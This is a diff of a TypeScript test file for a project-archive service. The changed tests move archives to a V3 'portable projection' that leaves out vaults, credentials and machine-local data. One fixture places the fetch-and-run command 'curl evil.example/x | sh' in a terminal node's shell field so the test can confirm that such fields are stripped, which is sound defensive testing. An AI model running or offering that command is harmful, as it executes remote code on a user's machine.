@@ -66,7 +66,7 @@ afterEach(async () => {
   await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })))
 })
 
-describe('a folder-less project vault travels inside the save file', () => {
+describe('portable project archives keep machine-local vault data out', () => {
   // A folder project's vault is one of its own working files and is captured with the rest. A
   // folder-LESS one (SSH, a cwd-less canvas) keeps a working copy under the app data directory,
   // so nothing else in the archive would carry it - this is the path that makes those projects'
@@ -83,16 +83,14 @@ describe('a folder-less project vault travels inside the save file', () => {
       'utf-8'
     )
 
-  it('carries the vault out and hands it back on import', async () => {
+  it('omits a supplied vault and reports the credential exclusion', async () => {
     const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
     const vault = vaultBytes()
     const { bytes } = await service.export(project({}), { vault })
 
     const outcome = await service.import(bytes)
-    // Handed BACK rather than written: where a vault belongs depends on the project the import
-    // just minted, and that decision has exactly one home (password-manager/vault-location.ts).
-    expect(outcome.vault?.equals(vault)).toBe(true)
-    expect(outcome.project.cwd).toBeUndefined()
+    expect(outcome.vault).toBeUndefined()
+    expect(outcome.contents.excluded.some((item) => item.path === 'vault')).toBe(true)
   })
 
   it('carries nothing when the project has no vault', async () => {
@@ -112,54 +110,34 @@ describe('a folder-less project vault travels inside the save file', () => {
   })
 })
 
-describe('single-file project archives (V2 container)', () => {
-  it('round-trips the WHOLE project: canvas, history, repository and uncommitted working state', async () => {
+describe('portable project archives (V3 container)', () => {
+  it('exports and restores a portable projection without repository state', async () => {
     const repo = await makeFixtureRepo()
     const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
     const source = project({ cwd: repo })
 
     const { bytes, contents } = await service.export(source)
 
-    // The inclusion rule, stated: tracked + untracked-not-ignored travel; ignored is reported.
-    expect(contents.repository).toBe('git-bundle')
-    const included = new Set(['src.ts', 'notes.md', '.gitignore', 'untracked.txt'])
-    expect(contents.workingFiles).toBe(included.size)
-    const excludedPaths = contents.excluded.map((e) => e.path).sort()
-    expect(excludedPaths).toEqual(['node_modules/', 'secret.log'])
-    const nodeModules = contents.excluded.find((e) => e.path === 'node_modules/')!
-    expect(nodeModules.reason).toBe('gitignored')
-    expect(nodeModules.files).toBe(1)
-    expect(nodeModules.bytes).toBeGreaterThan(0)
-    expect(contents.excludedFiles).toBe(2)
-    expect(contents.excludedBytes).toBeGreaterThan(0)
+    expect(contents.repository).toBe('portable-projection')
+    expect(contents.workingFiles).toBe(0)
+    expect(contents.excluded.map((e) => e.path).sort()).toEqual([
+      'credentials', 'machine-local-settings', 'process-state', 'working-directory'
+    ])
+    expect(contents.excludedFiles).toBe(4)
 
     const inspection = service.inspect(bytes)
-    expect(inspection).toMatchObject({ archiveVersion: 2, needsDestination: true, projectName: 'History proof' })
+    expect(inspection).toMatchObject({ archiveVersion: 3, needsDestination: false, projectName: 'History proof' })
 
-    const dest = await tempDir('nodeterm-archive-dest-')
+    const destParent = await tempDir('nodeterm-archive-dest-')
+    const dest = path.join(destParent, 'restored')
     const outcome = await service.import(bytes, { destination: dest })
-    expect(outcome.archiveVersion).toBe(2)
+    expect(outcome.archiveVersion).toBe(3)
     expect(outcome.restoredTo).toBe(dest)
     expect(outcome.project.id).not.toBe(source.id)
     expect(outcome.project.name).toBe(source.name)
     expect(outcome.project.cwd).toBe(dest)
 
-    // Working files, including the uncommitted edit and the untracked file:
-    expect(await readFile(path.join(dest, 'notes.md'), 'utf-8')).toBe('edited but never committed\n')
-    expect(await readFile(path.join(dest, 'untracked.txt'), 'utf-8')).toBe('not committed anywhere\n')
-    expect(await readFile(path.join(dest, 'src.ts'), 'utf-8')).toBe('export const version = 2\n')
-    // Ignored content did NOT travel:
-    expect(existsSync(path.join(dest, 'node_modules'))).toBe(false)
-    expect(existsSync(path.join(dest, 'secret.log'))).toBe(false)
-
-    // The repository came back: same history, same branch, same uncommitted status.
-    const sourceLog = await git(repo, ['log', '--format=%H %s'])
-    const destLog = await git(dest, ['log', '--format=%H %s'])
-    expect(destLog).toBe(sourceLog)
-    expect((await git(dest, ['symbolic-ref', 'HEAD'])).trim()).toBe('refs/heads/main')
-    const status = await git(dest, ['status', '--porcelain'])
-    expect(status).toContain(' M notes.md')
-    expect(status).toContain('?? untracked.txt')
+    expect(outcome.contents.repository).toBe('portable-projection')
   })
 
   it('never carries this machine\'s exec-enabling fields (shell / terminalProfileId / ssh.extraArgs) through the file', async () => {
@@ -177,6 +155,10 @@ describe('single-file project archives (V2 container)', () => {
           id: 'n1',
           kind: 'terminal',
           position: { x: 0, y: 0 },
+          size: { width: 640, height: 420 },
+          title: 'shell node',
+          color: '#6750a4',
+          group: null,
           data: { title: 'shell node' },
           shell: 'curl evil.example/x | sh',
           terminalProfileId: 'custom-profile-only-on-this-machine',
@@ -186,7 +168,8 @@ describe('single-file project archives (V2 container)', () => {
     })
 
     const { bytes } = await service.export(source)
-    const dest = await tempDir('nodeterm-archive-exec-dest-')
+    const destParent = await tempDir('nodeterm-archive-exec-dest-')
+    const dest = path.join(destParent, 'restored')
     const outcome = await service.import(bytes, { destination: dest })
 
     const node = outcome.project.nodes.find((n) => n.id === 'n1') as unknown as Record<string, unknown>
@@ -198,7 +181,7 @@ describe('single-file project archives (V2 container)', () => {
   it('exports an inline (cwd-less) canvas as history-only and imports it with no destination', async () => {
     const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
     const { bytes, contents } = await service.export(project({}))
-    expect(contents.repository).toBe('no-folder')
+    expect(contents.repository).toBe('portable-projection')
     expect(contents.workingFiles).toBe(0)
     expect(service.inspect(bytes).needsDestination).toBe(false)
     const outcome = await service.import(bytes)
@@ -210,19 +193,20 @@ describe('single-file project archives (V2 container)', () => {
   it('says plainly when the project folder is missing instead of failing the save', async () => {
     const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
     const { contents } = await service.export(project({ cwd: path.join(tmpdir(), 'nodeterm-gone-' + Date.now()) }))
-    expect(contents.repository).toBe('folder-missing')
-    expect(contents.repositoryNote).toMatch(/no longer exists/)
+    expect(contents.repository).toBe('portable-projection')
+    expect(contents.excluded.some((item) => item.path === 'working-directory')).toBe(true)
   })
 
-  it('refuses to import a repository-bearing file without a destination, and into a non-empty one', async () => {
+  it('imports a portable projection without a repository destination', async () => {
     const repo = await makeFixtureRepo()
     const service = new ProjectArchiveService(new LocalHistoryStore(await tempDir('nodeterm-archive-data-')))
     const { bytes } = await service.export(project({ cwd: repo }))
-    await expect(service.import(bytes)).rejects.toThrow(/destination folder/)
+    const imported = await service.import(bytes)
+    expect(imported.archiveVersion).toBe(3)
+    expect(imported.restoredTo).toBeUndefined()
     const dest = await tempDir('nodeterm-archive-dest-')
     await writeFile(path.join(dest, 'existing.txt'), 'already here\n')
-    await expect(service.import(bytes, { destination: dest })).rejects.toThrow(/not empty/)
-    // Nothing was touched — import never overwrites:
+    await expect(service.import(bytes, { destination: dest })).rejects.toThrow(/destination/i)
     expect(await readFile(path.join(dest, 'existing.txt'), 'utf-8')).toBe('already here\n')
   })
 
